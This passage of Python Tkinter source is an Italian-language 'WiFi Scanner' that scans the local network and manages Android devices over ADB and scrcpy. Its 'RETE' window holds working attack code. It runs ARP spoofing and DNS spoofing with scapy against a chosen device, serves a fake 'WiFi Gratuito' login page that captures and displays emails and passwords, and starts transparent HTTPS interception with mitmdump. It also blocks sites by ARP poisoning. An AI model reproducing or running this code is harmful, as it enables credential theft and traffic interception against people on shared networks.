        listbox.pack(fill="both", expand=True, padx=16, pady=6)

        out = subprocess.run([ADB_PATH, "-s", s, "shell", "pm", "list", "packages", "-3"],
                            capture_output=True, text=True).stdout
        packages = sorted([l.replace("package:", "").strip()
                          for l in out.splitlines() if l.strip()])

        def aggiorna(*args):
            listbox.delete(0, "end")
            filtro = search_var.get().lower()
            for p in packages:
                if filtro in p.lower():
                    listbox.insert("end", p)

        search_var.trace("w", aggiorna)
        aggiorna()

        def disinstalla():
            sel = listbox.curselection()
            if not sel: return
            pkg = listbox.get(sel[0])
            if messagebox.askyesno("Conferma", f"Disinstallare {pkg}?"):
                r = subprocess.run([ADB_PATH, "-s", s, "uninstall", pkg],
                                  capture_output=True, text=True)
                if "Success" in r.stdout:
                    messagebox.showinfo("OK", f"{pkg} rimossa!")
                    aggiorna()
                else:
                    messagebox.showerror("Errore", r.stdout.strip()[:100])

        tk.Button(win3, text="🗑  DISINSTALLA", font=("Courier New", 10, "bold"),
                  bg=RED, fg=BG, relief="flat", padx=16, pady=6,
                  cursor="hand2", command=disinstalla).pack(pady=4)

    tk.Button(trasf_row, text="📤  INVIA FILE",
              font=("Courier New", 10, "bold"),
              bg=SURFACE, fg=ACCENT, relief="flat", padx=10, pady=6,
              cursor="hand2", command=invia_file).pack(side="left", padx=3)

    tk.Button(trasf_row, text="📥  RICEVI FILE",
              font=("Courier New", 10, "bold"),
              bg=SURFACE, fg=GREEN, relief="flat", padx=10, pady=6,
              cursor="hand2", command=ricevi_file).pack(side="left", padx=3)

    tk.Button(trasf_row, text="📦  INSTALLA APK",
              font=("Courier New", 10, "bold"),
              bg=SURFACE, fg=YELLOW, relief="flat", padx=10, pady=6,
              cursor="hand2", command=installa_apk).pack(side="left", padx=3)

    tk.Button(trasf_row, text="📋  APP",
              font=("Courier New", 10, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=10, pady=6,
              cursor="hand2", command=gestisci_app).pack(side="left", padx=3)

    tk.Button(action_frame, text="Chiudi", font=("Courier New", 10),
              bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
              cursor="hand2", command=win.destroy).pack(pady=(4,0))
    if already_connected:
        action_frame.pack(pady=10)


class WifiScanner(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("WiFi Scanner")
        self.geometry("960x580")
        self.resizable(True, True)
        self.configure(bg=BG)
        self.devices = []
        self._build_ui()

    def _build_ui(self):
        hdr = tk.Frame(self, bg=BG)
        hdr.pack(fill="x", padx=24, pady=(20, 0))

        tk.Label(hdr, text="WIFI SCANNER", font=("Courier New", 20, "bold"),
                 bg=BG, fg=ACCENT).pack(side="left")

        self.status_dot = tk.Label(hdr, text="●", font=("Courier New", 14), bg=BG, fg=MUTED)
        self.status_dot.pack(side="left", padx=(12, 4))

        self.status_lbl = tk.Label(hdr, text="in attesa...", font=("Courier New", 11), bg=BG, fg=MUTED)
        self.status_lbl.pack(side="left")

        self.count_lbl = tk.Label(hdr, text="", font=("Courier New", 11, "bold"), bg=BG, fg=GREEN)
        self.count_lbl.pack(side="right")

        info_frame = tk.Frame(self, bg=SURFACE, highlightthickness=1, highlightbackground=BORDER)
        info_frame.pack(fill="x", padx=24, pady=(12, 0))

        self.subnet_lbl = tk.Label(info_frame, text="Rete locale: rilevamento...",
                                   font=("Courier New", 10), bg=SURFACE, fg=MUTED, padx=12, pady=6)
        self.subnet_lbl.pack(side="left")

        self.time_lbl = tk.Label(info_frame, text="", font=("Courier New", 10), bg=SURFACE, fg=MUTED, padx=12, pady=6)
        self.time_lbl.pack(side="right")

        table_frame = tk.Frame(self, bg=BG)
        table_frame.pack(fill="both", expand=True, padx=24, pady=12)

        cols = ("ip", "hostname", "mac", "stato", "blocco")
        self.tree = ttk.Treeview(table_frame, columns=cols, show="headings", selectmode="browse")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=SURFACE, foreground=TEXT, fieldbackground=SURFACE,
                        rowheight=36, borderwidth=0, font=("Courier New", 10))
        style.configure("Treeview.Heading", background=BG, foreground=MUTED,
                        font=("Courier New", 9, "bold"), relief="flat", borderwidth=0)
        style.map("Treeview", background=[("selected", "#1f2937")])

        headers = {"ip": ("IP ADDRESS", 130), "hostname": ("HOSTNAME", 170), "mac": ("MAC ADDRESS", 160), "stato": ("STATO", 90), "blocco": ("BLOCCO", 90)}

        self._sort_reverse = {}
        for col, (label, width) in headers.items():
            self.tree.heading(col, text=label,
                command=lambda c=col: self._sort_column(c))
            self.tree.column(col, width=width, anchor="w")

        vsb = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")

        self.tree.tag_configure("online",  foreground=GREEN)
        self.tree.tag_configure("blocked", foreground=RED)
        self.tree.tag_configure("self",    foreground=ACCENT)

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(fill="x", padx=24, pady=(0, 20))

        self.scan_btn = tk.Button(btn_frame, text="▶  SCANSIONA",
                                  font=("Courier New", 11, "bold"),
                                  bg=ACCENT, fg=BG, activebackground="#79c0ff",
                                  activeforeground=BG, relief="flat",
                                  padx=20, pady=8, cursor="hand2",
                                  command=self._start_scan)
        self.scan_btn.pack(side="left")

        self.winrem_btn = tk.Button(btn_frame, text="🖥  WIN REMOTE",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=ACCENT, activebackground=BORDER,
                                   relief="flat", padx=16, pady=8, cursor="hand2",
                                   command=self._windows_remote)
        self.winrem_btn.pack(side="left", padx=(10, 0))

        self.block_btn = tk.Button(btn_frame, text="🔴  BLOCCA",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=RED, activebackground=BORDER,
                                   relief="flat", padx=20, pady=8, cursor="hand2",
                                   command=self._toggle_block)
        self.block_btn.pack(side="left", padx=(10, 0))






        self.gestisci_btn = tk.Button(btn_frame, text="⚙  GESTISCI",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=YELLOW, activebackground=BORDER,
                                   relief="flat", padx=20, pady=8, cursor="hand2",
                                   command=self._gestisci)
        self.gestisci_btn.pack(side="left", padx=(10, 0))

        self.export_btn = tk.Button(btn_frame, text="💾  ESPORTA",
                                    font=("Courier New", 11),
                                    bg=SURFACE, fg=TEXT, activebackground=BORDER,
                                    relief="flat", padx=20, pady=8, cursor="hand2",
                                    command=self._export)
        self.export_btn.pack(side="left", padx=(10, 0))

        self.rete_btn = tk.Button(btn_frame, text="🌐  RETE",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=ACCENT, activebackground=BORDER,
                                   relief="flat", padx=14, pady=8, cursor="hand2",
                                   command=self._rete)
        self.rete_btn.pack(side="left", padx=(10, 0))

        self.pwd_btn = tk.Button(btn_frame, text="🔑  PWD",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=MUTED, activebackground=BORDER,
                                   relief="flat", padx=14, pady=8, cursor="hand2",
                                   command=cambia_password_dialog)
        self.pwd_btn.pack(side="right", padx=(10, 0))

        self.progress = ttk.Progressbar(btn_frame, mode="determinate", length=120, maximum=100)
        self.progress.pack(side="right")

        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        self.after(400, self._start_scan)

    def _sort_column(self, col):
        items = [(self.tree.set(k, col), k) for k in self.tree.get_children("")]
        rev = self._sort_reverse.get(col, False)
        items.sort(reverse=rev)
        for i, (_, k) in enumerate(items):
            self.tree.move(k, "", i)
        self._sort_reverse[col] = not rev

    def _on_select(self, _=None):
        sel = self.tree.selection()
        if not sel:
            return
        ip = self.tree.item(sel[0])["values"][0]
        if ip in blocked_threads:
            self.block_btn.configure(text="🟢  SBLOCCA", fg=GREEN)
        else:
            self.block_btn.configure(text="🔴  BLOCCA", fg=RED)

    def _connetti_auto(self):
        """Connessione automatica via scrcpy --tcpip (richiede USB la prima volta)"""
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]

        win = tk.Toplevel()
        win.title("Connessione automatica")
        win.geometry("500x420")
        win.configure(bg=BG)
        win.resizable(False, False)

        tk.Label(win, text="CONNETTI AUTOMATICO", font=("Courier New", 14, "bold"),
                 bg=BG, fg=ACCENT).pack(pady=(16,4))
        tk.Label(win, text=f"Dispositivo: {ip}",
                 font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)

        # spiegazione
        tk.Label(win, text="Modalita 1: USB → WiFi (prima volta)",
                 font=("Courier New", 10, "bold"), bg=BG, fg=YELLOW).pack(anchor="w", padx=24)
        tk.Label(win, text="Collega via USB, poi clicca. Scrcpy trova IP e si connette da solo.",
                 font=("Courier New", 9), bg=BG, fg=MUTED, justify="left").pack(anchor="w", padx=32)

        tk.Label(win, text="Modalita 2: WiFi diretto (se gia connesso prima)",
                 font=("Courier New", 10, "bold"), bg=BG, fg=GREEN).pack(anchor="w", padx=24)
        tk.Label(win, text=f"Usa l'IP selezionato ({ip}) e si connette direttamente via WiFi.",
                 font=("Courier New", 9), bg=BG, fg=MUTED, justify="left").pack(anchor="w", padx=32)

        tk.Label(win, text="Modalita 3: SSH Tunnel (reti diverse/internet)",
                 font=("Courier New", 10, "bold"), bg=BG, fg=RED).pack(anchor="w", padx=24)
        tk.Label(win, text="Connetti adb via SSH a PC remoto. Serve accesso SSH.",
                 font=("Courier New", 9), bg=BG, fg=MUTED, justify="left").pack(anchor="w", padx=32)

        ssh_frame = tk.Frame(win, bg=BG); ssh_frame.pack(padx=32, fill="x", pady=4)
        tk.Label(ssh_frame, text="SSH host:", font=("Courier New", 9), bg=BG, fg=MUTED).pack(side="left")
        ssh_entry = tk.Entry(ssh_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                             insertbackground=TEXT, relief="flat", bd=4, width=20)
        ssh_entry.insert(0, "utente@ip_remoto")
        ssh_entry.pack(side="left", padx=6)

        log_lbl = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=GREEN, wraplength=440)
        log_lbl.pack(pady=6)

        def mod1_usb():
            log_lbl.configure(text="Avvio scrcpy --tcpip (assicurati USB collegato)...", fg=YELLOW)
            win.update()
            p = subprocess.Popen([SCRCPY_PATH, "--tcpip"],
                                 cwd=SCRCPY_DIR, creationflags=subprocess.CREATE_NO_WINDOW)
            log_lbl.configure(text="Scrcpy avviato! Controlla che il telefono sia collegato via USB.", fg=GREEN)

        def mod2_wifi():
            log_lbl.configure(text=f"Connessione WiFi a {ip}...", fg=YELLOW)
            win.update()
            r = subprocess.run([ADB_PATH, "connect", f"{ip}:5555"], capture_output=True, text=True)
            if "connected" in r.stdout.lower():
                subprocess.Popen([SCRCPY_PATH, f"--tcpip={ip}:5555"], cwd=SCRCPY_DIR)
                log_lbl.configure(text=f"Connesso a {ip}!", fg=GREEN)
            else:
                log_lbl.configure(text=f"Errore: {r.stdout.strip()}", fg=RED)

        def mod3_ssh():
            ssh_host = ssh_entry.get().strip()
            if not ssh_host or ssh_host == "utente@ip_remoto":
                log_lbl.configure(text="Inserisci l'host SSH!", fg=RED)
                return
            log_lbl.configure(text=f"Apro tunnel SSH verso {ssh_host}...", fg=YELLOW)
            win.update()
            # apri tunnel SSH in background
            subprocess.Popen([
                "ssh", "-CN",
                "-L5038:localhost:5037",
                "-R27183:localhost:27183",
                ssh_host
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            import time; time.sleep(2)
            # imposta ADB server socket e avvia scrcpy
            env = os.environ.copy()
            env["ADB_SERVER_SOCKET"] = "tcp:localhost:5038"
            subprocess.Popen([SCRCPY_PATH], cwd=SCRCPY_DIR, env=env)
            log_lbl.configure(text=f"Tunnel SSH aperto verso {ssh_host}! Scrcpy avviato.", fg=GREEN)

        btns = tk.Frame(win, bg=BG); btns.pack(pady=8)
        tk.Button(btns, text="1. USB→WiFi", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=mod1_usb).pack(side="left", padx=4)
        tk.Button(btns, text="2. WiFi diretto", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=GREEN, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=mod2_wifi).pack(side="left", padx=4)
        tk.Button(btns, text="3. SSH Tunnel", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=mod3_ssh).pack(side="left", padx=4)
        tk.Button(btns, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=win.destroy).pack(side="left", padx=4)

    def _gestisci(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]
        tags = self.tree.item(sel[0])["tags"]
        tag  = tags[0] if tags else ""
        if tag == "self":
            messagebox.showinfo("Gestisci", "Questo e il tuo stesso PC!")
            return
        open_gestisci(ip)

    def _rete(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]
        mac = self.tree.item(sel[0])["values"][2]
        tags = self.tree.item(sel[0])["tags"]
        tag  = tags[0] if tags else ""

        win = tk.Toplevel()
        win.title(f"RETE — {ip}")
        win.geometry("600x620")
        win.configure(bg=BG)
        win.resizable(False, False)

        tk.Label(win, text="RETE", font=("Courier New", 16, "bold"),
                 bg=BG, fg=ACCENT).pack(pady=(16,2))
        tk.Label(win, text=f"Dispositivo: {ip}  |  MAC: {mac}",
                 font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)

        status = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=MUTED)

        # ── WAKE ON LAN ──
        tk.Label(win, text="WAKE ON LAN", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack()
        r1 = tk.Frame(win, bg=BG); r1.pack(pady=4)

        def do_wol():
            if mac == "—":
                status.configure(text="MAC non disponibile!", fg=RED)
                return
            try:
                import socket, struct
                mac_clean = mac.replace("-","").replace(":","")
                magic = bytes.fromhex("F" * 12 + mac_clean * 16)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    s.sendto(magic, ("255.255.255.255", 9))
                status.configure(text=f"Magic packet inviato a {mac}!", fg=GREEN)
            except Exception as e:
                status.configure(text=f"Errore: {e}", fg=RED)

        tk.Button(r1, text="⚡  WAKE ON LAN", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_wol).pack(side="left", padx=4)

        # ── CAPTIVE PORTAL + DNS SPOOFING ──
        tk.Label(win, text="CAPTIVE PORTAL + DNS SPOOFING", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))

        # tipo pagina
        tipo_var = tk.StringVar(value="login_fake")
        tipo_frame = tk.Frame(win, bg=BG); tipo_frame.pack(pady=2)
        tk.Radiobutton(tipo_frame, text="Login falso", variable=tipo_var, value="login_fake",
                       bg=BG, fg=TEXT, selectcolor=SURFACE, activebackground=BG,
                       font=("Courier New", 9)).pack(side="left", padx=6)
        tk.Radiobutton(tipo_frame, text="Redirect URL", variable=tipo_var, value="redirect",
                       bg=BG, fg=TEXT, selectcolor=SURFACE, activebackground=BG,
                       font=("Courier New", 9)).pack(side="left", padx=6)

        # url personalizzato
        url_frame = tk.Frame(win, bg=BG); url_frame.pack(pady=2)
        tk.Label(url_frame, text="URL redirect:", font=("Courier New", 9),
                 bg=BG, fg=MUTED).pack(side="left", padx=(0,4))
        portal_url_var = tk.StringVar(value="https://www.google.com")
        url_entry = tk.Entry(url_frame, textvariable=portal_url_var,
                             font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                             insertbackground=TEXT, relief="flat", bd=4, width=26)
        url_entry.pack(side="left")

        # titolo pagina login fake
        title_frame = tk.Frame(win, bg=BG); title_frame.pack(pady=2)
        tk.Label(title_frame, text="Titolo login:", font=("Courier New", 9),
                 bg=BG, fg=MUTED).pack(side="left", padx=(0,4))
        title_var = tk.StringVar(value="WiFi Gratuito — Accedi")
        title_entry = tk.Entry(title_frame, textvariable=title_var,
                               font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                               insertbackground=TEXT, relief="flat", bd=4, width=26)
        title_entry.pack(side="left")

        portal_active = [False]
        server_ref = [None]
        creds_list = []

        def get_login_html(title):
            return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>{title}</title>
<style>
body{{margin:0;background:#1a1a2e;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}}
.box{{background:white;padding:40px;border-radius:16px;width:320px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.4);}}
h2{{color:#333;margin-bottom:24px;}}
input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box;}}
button{{width:100%;padding:14px;background:#4285f4;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px;}}
button:hover{{background:#3367d6;}}
p{{color:#888;font-size:12px;margin-top:16px;}}
</style></head>
<body><div class="box">
<h2>{title}</h2>
<form method="POST" action="/login">
<input name="email" type="text" placeholder="Email o utente" required/>
<input name="password" type="password" placeholder="Password" required/>
<button type="submit">Accedi</button>
</form>
<p>Inserisci le tue credenziali per accedere alla rete</p>
</div></body></html>"""

        # ── ARP SPOOF + DNS INTERCEPT ──
        dns_active = [False]
        dns_threads = [None]

        def do_dns_intercept():
            if dns_active[0]:
                dns_active[0] = False
                dns_btn.configure(text="🎯  AVVIA DNS+ARP", fg=RED)
                status.configure(text="DNS intercept fermato", fg=MUTED)
                return

            my_ip = self._get_local_ip()
            gw = get_gateway()
            redirect_ip = my_ip

            import threading
            def dns_arp_thread():
                try:
                    from scapy.all import ARP, Ether, sendp, sniff, DNS, DNSRR, DNSQR, IP, UDP, get_if_hwaddr, conf, srp

                    # trova interfaccia corretta (Ethernet o Wi-Fi)
                    import re as re2
                    route_out = subprocess.run(["route", "print", "0.0.0.0"], 
                        capture_output=True, text=True).stdout
                    my_ip_local = self._get_local_ip()
                    iface = conf.iface
                    for i in conf.ifaces.values():
                        try:
                            if hasattr(i, 'ip') and i.ip == my_ip_local:
                                iface = i.name
                                break
                            if hasattr(i, 'ips') and my_ip_local in str(i.ips):
                                iface = i.name
                                break
                        except: pass
                    my_mac = get_if_hwaddr(iface)

                    # risolvi MAC da tabella ARP di Windows
                    def resolve(ip_addr):
                        import re
                        # prima prova tabella ARP locale
                        out = subprocess.run(["arp", "-a", ip_addr], capture_output=True, text=True).stdout
                        m = re.search(r"([\w-]{17})", out)
                        if m:
                            return m.group(1).replace("-", ":")
                        # fallback scapy
                        try:
                            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout=3, verbose=0)
                            if ans: return ans[0][1].hwsrc
                        except: pass
                        return None

                    target_mac = resolve(ip)
                    gw_mac = resolve(gw)
                    if not target_mac or not gw_mac:
                        status.configure(text=f"MAC non trovato: target={target_mac} gw={gw_mac}", fg=RED)
                        return

                    # arp spoof in background
                    def spoof_loop():
                        from scapy.all import ARP, Ether, sendp
                        pkt_t = Ether(dst=target_mac)/ARP(op=2, pdst=ip, hwdst=target_mac, psrc=gw, hwsrc=my_mac)
                        pkt_g = Ether(dst=gw_mac)/ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=ip, hwsrc=my_mac)
                        while dns_active[0]:
                            sendp(pkt_t, iface=iface, verbose=0)
                            sendp(pkt_g, iface=iface, verbose=0)
                            import time; time.sleep(1.5)
                        # ripristina
                        r_t = Ether(dst=target_mac)/ARP(op=2, pdst=ip, hwdst=target_mac, psrc=gw, hwsrc=gw_mac)
                        r_g = Ether(dst=gw_mac)/ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=ip, hwsrc=target_mac)
                        for _ in range(5):
                            sendp(r_t, iface=iface, verbose=0)
                            sendp(r_g, iface=iface, verbose=0)

                    threading.Thread(target=spoof_loop, daemon=True).start()

                    # abilita IP forwarding
                    subprocess.run(["netsh", "interface", "ipv4", "set", "interface",
                        "Ethernet", "forwarding=enabled"], capture_output=True)

                    # intercetta DNS e rispondi con nostro IP
                    def dns_spoof(pkt):
                        if not dns_active[0]: return
                        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                            spoofed = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                                      UDP(dport=pkt[UDP].sport, sport=53) /
                                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                          an=DNSRR(rrname=pkt[DNSQR].qname,
                                                   ttl=10, rdata=redirect_ip)))
                            from scapy.all import send
                            send(spoofed, verbose=0)

                    sniff(filter=f"udp port 53 and host {ip}",
                          prn=dns_spoof, store=0,
                          stop_filter=lambda x: not dns_active[0])

                except ImportError:
                    status.configure(text="Scapy non trovato!", fg=RED)
                except Exception as e:
                    status.configure(text=f"Errore: {str(e)[:50]}", fg=RED)

            dns_active[0] = True
            t = threading.Thread(target=dns_arp_thread, daemon=True)
            t.start()
            dns_threads[0] = t
            dns_btn.configure(text="⛔  FERMA DNS+ARP", fg=MUTED)
            status.configure(text=f"ARP+DNS attivo — tutto il traffico DNS di {ip} va a {my_ip}:80", fg=GREEN)

        dns_btn = tk.Button(r2 if False else tk.Frame(win, bg=BG),
                  text="🎯  AVVIA DNS+ARP", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_dns_intercept)

        dns_row = tk.Frame(win, bg=BG); dns_row.pack(pady=(0,6))
        dns_btn2 = tk.Button(dns_row, text="🎯  AVVIA DNS+ARP SPOOF",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_dns_intercept)
        dns_btn2.pack(side="left", padx=4)
        tk.Label(dns_row, text="← avvia prima il portal poi questo",
                 font=("Courier New", 8), bg=BG, fg=MUTED).pack(side="left")

        # ridefinisci dns_btn per riferimento
        dns_btn = dns_btn2

        mitm_proc = [None]
        def do_mitm():
            if mitm_proc[0]:
                mitm_proc[0].terminate()
                mitm_proc[0] = None
                mitm_btn.configure(text="🔐  AVVIA HTTPS INTERCEPT", fg=YELLOW)
                status.configure(text="HTTPS intercept fermato", fg=MUTED)
                return
            import tempfile, os
            tipo = tipo_var.get()
            url = portal_url_var.get().strip()
            title = title_var.get().strip()
            tmpf = os.path.join(os.path.expanduser("~"), "mitm_script.py")
            if tipo == "redirect":
                script = 'import mitmproxy.http\ndef request(flow):\n    flow.response = mitmproxy.http.Response.make(302, b"", {"Location": "' + url + '"})\n'
            else:
                html = "<html><body style=\'background:#111;display:flex;align-items:center;justify-content:center;height:100vh;\'><div style=\'background:white;padding:40px;border-radius:16px;width:320px;text-align:center;\'><h2>" + title + "</h2><form method=POST><input name=u placeholder=Email style=\'width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;\'><input name=p type=password placeholder=Password style=\'width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;\'><button style=\'width:100%;padding:14px;background:#4285f4;color:white;border:none;border-radius:8px;\'>Accedi</button></form></div></body></html>"
                script = 'import mitmproxy.http\ndef request(flow):\n    flow.response = mitmproxy.http.Response.make(200, b"""' + html + '""", {"Content-Type": "text/html"})\n'
            with open(tmpf, "w") as f:
                f.write(script.replace("\\n", "\n"))
            mitmdump_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Packages",
                    "PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0",
                    "LocalCache", "local-packages", "Python311", "Scripts", "mitmdump.exe")
            p = subprocess.Popen([mitmdump_path, "--mode", "transparent",
                "--listen-host", "0.0.0.0", "--listen-port", "8080", "-s", tmpf],
                creationflags=subprocess.CREATE_NO_WINDOW)
            mitm_proc[0] = p
            mitm_btn.configure(text="⛔  FERMA HTTPS", fg=RED)
            status.configure(text="HTTPS intercept attivo su porta 8080", fg=GREEN)

        mitm_row = tk.Frame(win, bg=BG); mitm_row.pack(pady=(0,4))
        mitm_btn = tk.Button(mitm_row, text="🔐  AVVIA HTTPS INTERCEPT",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_mitm)
        mitm_btn.pack(side="left", padx=4)
        tk.Label(mitm_row, text="intercetta anche HTTPS",
                 font=("Courier New", 8), bg=BG, fg=MUTED).pack(side="left")

        def do_portal():
            if portal_active[0]:
                if server_ref[0]:
                    server_ref[0].shutdown()
                    server_ref[0] = None
                portal_active[0] = False
                portal_btn.configure(text="🌐  AVVIA PORTAL", fg=ACCENT)
                if creds_list:
                    status.configure(text=f"Fermato — {len(creds_list)} credenziali catturate!", fg=YELLOW)
                    # mostra credenziali
                    creds_win = tk.Toplevel(win)
                    creds_win.title("Credenziali catturate")
                    creds_win.configure(bg=BG)
                    creds_win.geometry("400x300")
                    tk.Label(creds_win, text="CREDENZIALI CATTURATE",
                             font=("Courier New", 11, "bold"), bg=BG, fg=GREEN).pack(pady=10)
                    txt = tk.Text(creds_win, font=("Courier New", 10), bg=SURFACE,
                                  fg=GREEN, relief="flat", padx=10, pady=10)
                    txt.pack(fill="both", expand=True, padx=10, pady=10)
                    for c in creds_list:
                        txt.insert("end", "Utente: " + c["email"] + "\nPassword: " + c["password"] + "\n---\n")
                else:
                    status.configure(text="Portal fermato — nessuna credenziale", fg=MUTED)
            else:
                creds_list.clear()
                tipo = tipo_var.get()
                url = portal_url_var.get().strip()
                title = title_var.get().strip()
                my_ip = self._get_local_ip()

                import threading, http.server, urllib.parse

                class Handler(http.server.BaseHTTPRequestHandler):
                    def do_GET(self):
                        if tipo == "redirect":
                            self.send_response(302)
                            self.send_header("Location", url)
                            self.end_headers()
                        else:
                            html = get_login_html(title).encode()
                            self.send_response(200)
                            self.send_header("Content-Type", "text/html; charset=utf-8")
                            self.send_header("Content-Length", str(len(html)))
                            self.end_headers()
                            self.wfile.write(html)

                    def do_POST(self):
                        length = int(self.headers.get("Content-Length", 0))
                        body = self.rfile.read(length).decode()
                        params = urllib.parse.parse_qs(body)
                        email = params.get("email", [""])[0]
                        password = params.get("password", [""])[0]
                        creds_list.append({"email": email, "password": password})
                        status.configure(text=f"Credenziale catturata: {email}", fg=GREEN)
                        # redirect dopo login
                        self.send_response(302)
                        self.send_header("Location", "https://www.google.com")
                        self.end_headers()

                    def log_message(self, *a): pass

                def run_server():
                    srv = http.server.HTTPServer(("0.0.0.0", 8080), Handler)
                    server_ref[0] = srv
                    srv.serve_forever()

                threading.Thread(target=run_server, daemon=True).start()

                # DNS spoofing — punta DNS del dispositivo al nostro IP
                # (funziona se il dispositivo usa DNS automatico e noi siamo gateway)
                portal_active[0] = True
                portal_btn.configure(text="⛔  FERMA PORTAL", fg=RED)
                status.configure(text=f"Portal attivo su {my_ip}:80 — in attesa...", fg=GREEN)

        r2 = tk.Frame(win, bg=BG); r2.pack(pady=4)
        portal_btn = tk.Button(r2, text="🌐  AVVIA PORTAL",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=ACCENT, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_portal)
        portal_btn.pack(side="left")

        # ── BLOCCO SITI ──
        tk.Label(win, text="BLOCCO SITI SPECIFICI", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))
        siti_frame = tk.Frame(win, bg=BG); siti_frame.pack(pady=4, padx=24, fill="x")

        siti_entry = tk.Entry(siti_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                              insertbackground=TEXT, relief="flat", bd=4, width=28)
        siti_entry.insert(0, "instagram.com, tiktok.com")
        siti_entry.pack(side="left", padx=(0,6))

        blocco_siti_active = [False]
        blocco_thread = [None]
        siti_bloccati = []

        def toggle_blocco_siti():
            if blocco_siti_active[0]:
                blocco_siti_active[0] = False
                blocco_siti_btn.configure(text="🚫  BLOCCA SITI", fg=RED)
                status.configure(text="Blocco siti fermato", fg=MUTED)
                return

            siti_testo = siti_entry.get().strip()
            siti_bloccati.clear()
            for s in siti_testo.replace(" ", "").split(","):
                if s:
                    siti_bloccati.append(s.lower())

            if not siti_bloccati:
                status.configure(text="Inserisci almeno un sito!", fg=RED)
                return

            gw = get_gateway()
            my_ip = self._get_local_ip()

            import threading
            def blocco_thread_fn():
                try:
                    from scapy.all import ARP, Ether, sendp, sniff, DNS, DNSRR, DNSQR, IP, UDP, get_if_hwaddr, conf, srp

                    iface = conf.iface
                    my_mac = get_if_hwaddr(iface)

                    def resolve(ip_addr):
                        import re
                        out = subprocess.run(["arp", "-a", ip_addr], capture_output=True, text=True).stdout
                        m = re.search(r"([\w-]{17})", out)
                        if m: return m.group(1).replace("-", ":")
                        return None

                    target_mac = resolve(ip)
                    gw_mac = resolve(gw)
                    if not target_mac or not gw_mac:
                        status.configure(text="MAC non trovato", fg=RED)
                        return

                    # arp spoof
                    def spoof():
                        from scapy.all import ARP, Ether, sendp
                        pt = Ether(dst=target_mac)/ARP(op=2, pdst=ip, hwdst=target_mac, psrc=gw, hwsrc=my_mac)
                        pg = Ether(dst=gw_mac)/ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=ip, hwsrc=my_mac)
